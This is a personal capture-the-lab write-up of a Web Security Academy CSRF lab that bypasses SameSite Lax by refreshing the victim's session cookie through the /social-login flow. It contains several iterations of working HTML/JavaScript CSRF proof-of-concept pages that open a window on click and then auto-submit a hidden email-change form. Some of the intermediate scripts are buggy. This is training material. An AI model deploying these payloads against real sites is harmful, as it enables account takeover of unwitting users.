# [CSRF] Lab: SameSite Lax bypass via cookie refresh (1)

---

![Untitled](%5BCSRF%5D%20Lab%20SameSite%20Lax%20bypass%20via%20cookie%20refresh%20%2082942c1956964fe38a53375a1d85985a/Untitled.png)

- [ ]  Look for gadget to refresh user cookie
- [ ]  find a way to use that gadget by opening a new window within the victims browser so we can refresh there cookie, so the Lax will not protect against post request within the first 120 seconds
- [ ]  test exploit
- [ ]  make sure works then send to victim.

---

![Untitled](%5BCSRF%5D%20Lab%20SameSite%20Lax%20bypass%20via%20cookie%20refresh%20%2082942c1956964fe38a53375a1d85985a/Untitled%201.png)

so when going to my account when we arent logged in we’re redirected to this page with a strange path name. 

This is the entire transaction of login: 

![Untitled](%5BCSRF%5D%20Lab%20SameSite%20Lax%20bypass%20via%20cookie%20refresh%20%2082942c1956964fe38a53375a1d85985a/Untitled%202.png)

**me trying to understand what is going on here:** 

so the 0Auth Callback is what set the final session cookie that we will use when navigating the site: 

![Untitled](%5BCSRF%5D%20Lab%20SameSite%20Lax%20bypass%20via%20cookie%20refresh%20%2082942c1956964fe38a53375a1d85985a/Untitled%203.png)

as you can see when getting my account: 

![Untitled](%5BCSRF%5D%20Lab%20SameSite%20Lax%20bypass%20via%20cookie%20refresh%20%2082942c1956964fe38a53375a1d85985a/Untitled%204.png)

and changing email : 

![Untitled](%5BCSRF%5D%20Lab%20SameSite%20Lax%20bypass%20via%20cookie%20refresh%20%2082942c1956964fe38a53375a1d85985a/Untitled%205.png)

All the cookies match. 

right now I'm going to rule out all of the 0Auth pages as being possible gadgets we can use to refresh our cookie since all of them contain random values that we cant guess in the directory path. 

![Untitled](%5BCSRF%5D%20Lab%20SameSite%20Lax%20bypass%20via%20cookie%20refresh%20%2082942c1956964fe38a53375a1d85985a/Untitled%206.png)

what if we request this page? 

since it is setting the _interaction cookies so it removes the guessable value..

**SO I found that if we simply hit the logout button then go back to my-account the website begins resetting our session cookie once again. and issues and refreshes it for us in a logged in state.** 

- SO ill get to make the victim make request to `/logout` then request `/my-account`  then let it reset the session cookie then ill make the request to change the email.

![Untitled](%5BCSRF%5D%20Lab%20SameSite%20Lax%20bypass%20via%20cookie%20refresh%20%2082942c1956964fe38a53375a1d85985a/Untitled%207.png)

**URLS**

- LOGOUT: [https://0abf006004adafd0816d7532006d00b6.web-security-academy.net/logout](https://0abf006004adafd0816d7532006d00b6.web-security-academy.net/logout)
- My account : [https://0abf006004adafd0816d7532006d00b6.web-security-academy.net/my-account](https://0abf006004adafd0816d7532006d00b6.web-security-academy.net/my-account)
- social-login:
- auth: [https://oauth-0aee007a04bfafda818a73a302550003.oauth-server.net/auth?client_id=qrpho708nqmiv59fxvqds&redirect_uri=https://0abf006004adafd0816d7532006d00b6.web-security-academy.net/oauth-callback&response_type=code&scope=openid profile email](https://oauth-0aee007a04bfafda818a73a302550003.oauth-server.net/auth?client_id=qrpho708nqmiv59fxvqds&redirect_uri=https://0abf006004adafd0816d7532006d00b6.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email)
- other: [https://oauth-0aee007a04bfafda818a73a302550003.oauth-server.net/auth](https://oauth-0aee007a04bfafda818a73a302550003.oauth-server.net/auth?client_id=qrpho708nqmiv59fxvqds&redirect_uri=https://0abf006004adafd0816d7532006d00b6.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email)

**Decided do some more testing found we can repeat this request and get new session cookie without needing to log the user out:** 

![Untitled](%5BCSRF%5D%20Lab%20SameSite%20Lax%20bypass%20via%20cookie%20refresh%20%2082942c1956964fe38a53375a1d85985a/Untitled%208.png)

URL TO REPEAT REQUEST: [http://burpsuite/repeat/3/c7mal28deldojcja6y7k2lcz647otgez](http://burpsuite/repeat/3/c7mal28deldojcja6y7k2lcz647otgez)

but with these parameter I wonder if it will work for only my account which is most likely the situation but what if I request `/social-login` again? 

`/social-login` sends me to that page where it request the 0Auth call back to refresh the session cookie. 

```jsx
<script>
    window.onclick = () => {
        window.open('https://0abf006004adafd0816d7532006d00b6.web-security-academy.net/social-login');
        // Delay form submission by 2 seconds (2000 milliseconds)
        setTimeout(() => {
            document.forms[0].submit();
        }, 10000);
    }
</script>

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0abf006004adafd0816d7532006d00b6.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="testing&#64;chaningEmail&#46;ca" />
      <input type="submit" value="Submit request" style="display:none;" /> <!-- Hide the submit button -->
    </form>
    <script>
      history.pushState('', '', '/');
      // Removed the auto-submit to control it via the onclick event
    </script>
  </body>
</html>
```

this worked by only by chance: 

**NEW SCRIPT:** 

```jsx
<script>
    window.onclick = () => {
        window.open('https://0abf006004adafd0816d7532006d00b6.web-security-academy.net/social-login')
    }
    setTimeout(() => {
        window.location.href("https://0abf006004adafd0816d7532006d00b6.web-security-academy.net/my-account/change-email",);
        window.location.reload();
        document.forms[0].submit();
        }, 6000); // Delay redirection for 6 seconds
    
</script>

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="" method="POST">
      <input type="hidden" name="email" value="testing&#64;chaningEmail&#46;ca" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
    </script>
  </body>
</html>

```

using the replace function to refresh and change page to change-email

**FINAL:** 

```jsx
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aec003104a0f1098261711e004e0076.web-security-academy.net/change-email" method="POST">
      <input type="hidden" name="email" value="testing&#64;chaningEmail&#46;ca" />
      <input type="submit" value="Submit request" style="display:none;" /> <!-- Hide the submit button -->
    </form>
    <script>

        window.onclick = () => {
        window.open('https://0aec003104a0f1098261711e004e0076.web-security-academy.net/social-login');
        // Delay form submission by 2 seconds (2000 milliseconds)
   
        
      
       // Removed the auto-submit to control it via the onclick event
       setTimeout(() => {
            document.forms[0].submit();
        }, 10000);
    }
    </script>
  </body>
</html>
```

## My own custom script:

```jsx
<script>
    window.onclick = () => {
        window.open('https://0aec003104a0f1098261711e004e0076.web-security-academy.net/social-login');

    }
</script>

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
<script> window.reload(); </script>
    <form action="https://0aec003104a0f1098261711e004e0076.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="testing&#64;chaningmail&#46;ca" />
      <input type="submit" value="Submit request" style="display:none;" /> <!-- Hide the submit button -->
    </form>
    <script>
       setTimeout(() => {
   
            document.forms[0].submit();
        }, 12000);
      // Removed the auto-submit to control it via the onclick event
    </script>
  </body>
</html>
```

**NOTE: we need the reload to load the page again with all new values such as a updated session cookie to post.** 

![Untitled](%5BCSRF%5D%20Lab%20SameSite%20Lax%20bypass%20via%20cookie%20refresh%20%2082942c1956964fe38a53375a1d85985a/Untitled%209.png)